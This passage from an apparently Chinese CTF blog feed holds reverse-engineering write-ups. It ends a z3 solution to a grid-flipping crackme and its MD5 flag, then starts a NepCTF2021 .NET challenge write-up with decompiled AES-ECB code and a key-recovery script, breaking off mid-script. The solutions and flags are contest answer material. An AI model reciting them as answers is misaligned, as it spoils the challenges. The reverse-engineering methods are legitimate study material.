style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
]

posx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
posy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

solver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()

change &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ [BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;change&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%x%x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (i, j), &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) ]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; posx[k] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; posx[k] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; posy[k] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; posy[k] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:
                init_check[i][j] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; (change[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; posx[k]][j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; posy[k]])

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
        solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(change[i][j] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
        solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(init_check[i][j] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sat:
    length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    model &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; model[change[i][j]] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
                length &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; length &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;220&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; model[change[i][j]] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
                    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%X%X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (j, i), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
        print ()
    condition &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
            condition&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(change[i][j] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; int(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (model[change[i][j]])))
    solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(Or(condition))
print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;finish&amp;#39;&lt;/span&gt;)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ FilpGame python3 solve.py
2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF

finish
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;过程中踩到的坑：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这道题的行和列很绕，一定要看清楚；&lt;/li&gt;
&lt;li&gt;不知道为什么，&lt;code&gt;BitVec&lt;/code&gt; 大小不能设置成 $1$；&lt;/li&gt;
&lt;li&gt;这题的解有很多，所以最后需要用一个 &lt;code&gt;condition&lt;/code&gt; 和 &lt;code&gt;Or&lt;/code&gt; 来找到所有的解；&lt;/li&gt;
&lt;li&gt;如果对数没有最基本的约束的话，可能会出现一堆 &lt;code&gt;None&lt;/code&gt; 的情况。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;程序运行结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ FilpGame ./FilpGame.exe
Input: 2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999
B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF
right, vnctf&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;MD5&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D8
1949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF&lt;span style=&#34;color:#f92672&#34;&gt;)}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后算一下md5&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hashlib
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;md5()
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hl&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update(str&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(encoding&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hl&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c51a6d6d3929cd2a0192572e604b371d&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;拿到flag！&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;又学到了一些z3的用法，真不戳。&lt;/p&gt;
&lt;p&gt;这道题告诉我们，以后算法题无脑上z3就完事了。。。&lt;/p&gt;
&lt;h3 id=&#34;鸣谢&#34;&gt;鸣谢&lt;/h3&gt;
&lt;p&gt;感谢 SSGSS 师傅，在我纠结于官方WP的解法时提醒我还有Z3这个神奇的东西！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>NepCTF2021 re writeups</title>
        <link>/post/nepctf2021-re-writeups/</link>
        <pubDate>Mon, 22 Mar 2021 18:30:03 +0000</pubDate>
        
        <guid>/post/nepctf2021-re-writeups/</guid>
        <description>&lt;h2 id=&#34;hardsharp-net-逆向&#34;&gt;hardsharp (.NET 逆向)&lt;/h2&gt;
&lt;p&gt;使用exeinfo发现是 C# .NET文件&lt;/p&gt;
&lt;p&gt;直接用 dnSpy 打开&lt;/p&gt;
&lt;p&gt;找到主函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Main(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;[] args)
{
	AesClass aesClass = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; AesClass();
	&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; strB = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0&amp;#34;&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] array = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[]
	{
		&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
		&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;
	};
	Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome to nepnep csharp test! plz input the magical code:&amp;#34;&lt;/span&gt;);
	&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; text2 = Console.ReadLine();
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (text2.Length != &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;)
	{
		Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nope!&amp;#34;&lt;/span&gt;);
		Console.ReadKey();
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (text2.Substring(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) != &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nep{&amp;#34;&lt;/span&gt; || text2[&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;] != &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;)
	{
		Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nope!&amp;#34;&lt;/span&gt;);
		Console.ReadKey();
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i++)
	{
		text += Convert.ToChar((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(array[i] ^ &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;)).ToString();
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;.Compare(aesClass.AesEncrypt(text2, text), strB) == &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
	{
		Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wow, you pass it!&amp;#34;&lt;/span&gt;);
		Console.ReadKey();
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
	}
	Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nope!&amp;#34;&lt;/span&gt;);
	Console.ReadKey();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这才是真正的签到题吧&amp;hellip;&lt;/p&gt;
&lt;p&gt;发现是 AES 加密&lt;/p&gt;
&lt;p&gt;进入 AesEncrypt 函数看一眼&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; AesEncrypt(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; str, &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; key)
{
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;.IsNullOrEmpty(str))
	{
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] bytes = Encoding.UTF8.GetBytes(str);
	&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] array = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RijndaelManaged
	{
		Key = Encoding.UTF8.GetBytes(key),
		Mode = CipherMode.ECB,
		Padding = PaddingMode.PKCS7
	}.CreateEncryptor().TransformFinalBlock(bytes, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, bytes.Length);
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Convert.ToBase64String(array, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, array.Length);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现使用了 ECB 模式，那么直接上网找个 python 脚本计算就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;array &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;]
key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; array:
    key &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(i &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;)
print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;key: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;key&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;key length: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;len(key)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
